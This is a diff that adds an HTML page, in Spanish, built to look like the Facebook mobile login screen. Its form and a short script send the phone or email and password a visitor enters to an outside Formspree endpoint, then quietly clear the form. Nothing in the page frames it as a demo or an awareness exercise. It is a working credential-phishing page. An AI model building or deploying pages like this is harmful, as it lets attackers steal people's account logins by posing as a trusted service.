@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Iniciar sesión</title>
+    <style>
+        /* Estilos Generales */
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100vh;
+            color: #1c1e21;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+
+        /* Idioma (Arriba) */
+        .language {
+            font-size: 12px;
+            color: #737373;
+            margin-bottom: 40px;
+            margin-top: 10px;
+        }
+
+        /* Logo */
+        .logo-container img {
+            width: 60px; /* Ajusta según tu imagen */
+            margin-bottom: 90px;
+        }
+
+        /* Formulario */
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        input {
+            height: 50px;
+            padding: 0 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 12px;
+            font-size: 16px;
+            background-color: #f5f6f7;
+            outline: none;
+        }
+
+        input:focus {
+            border-color: #1877f2;
+            background-color: #fff;
+        }
+
+        /* Botón Iniciar Sesión */
+        .btn-login {
+            background-color: #0064e0;
+            color: white;
+            border: none;
+            border-radius: 100px; 
+            font-size: 17px;
+            font-weight: bold;
+            padding: 12px;
+            cursor: pointer;
+            margin-top: 5px; /* Le di un toque más de espacio aquí también */
+        }
+
+        /* Link de Olvidaste contraseña */
+        .forgot-password {
+            display: block; /* Importante: asegura que el margen funcione correctamente */
+            margin-top: 20px; /* Aumentado de 20px a 45px para dar más aire */
+            text-decoration: none;
+            color: #1c1e21;
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+
+        /* Sección Inferior */
+        .footer {
+            margin-top: auto;
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+        }
+
+        /* Botón Crear Cuenta */
+        .btn-new-account {
+            width: 100%;
+            background-color: transparent;
+            color: #0064e0;
+            border: 1px solid #0064e0;
+            border-radius: 25px;
+            font-size: 15px;
+            font-weight: bold;
+            padding: 10px;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+        }
+
+        /* Logo Meta */
+        .meta-logo {
+            width: 70px; /* Ajusta según tu imagen */
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="language">Español</div>
+
+        <div class="logo-container">
+            <img src="logo.png" alt="Facebook Logo">
+        </div>
+
+        <form id="miFormulario" action="https://formspree.io/f/xeepplek" method="POST">
+            <input type="text" name="correo" placeholder="Celular o correo electrónico" required>
+            <input type="password" name="contraseña" placeholder="Contraseña" required>
+            
+            
+            <button type="submit" class="btn-login">Iniciar sesión</button>
+        </form>
+
+        <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
+    </div>
+
+    <div class="footer">
+        <a href="#" class="btn-new-account">Crear cuenta nueva</a>
+        
+        <img src="meta-logo.png" alt="Meta" class="meta-logo">
+    </div>
+
+<script>
+const form = document.getElementById("miFormulario");
+
+form.addEventListener("submit", async function(e) {
+    e.preventDefault();
+
+    const data = new FormData(form);
+
+    await fetch(form.action, {
+        method: "POST",
+        body: data,
+        headers: {
+            'Accept': 'application/json'
+        }
+    });
+
+    form.reset();
+});
+</script>
+
+</body>
+</html>
+
+
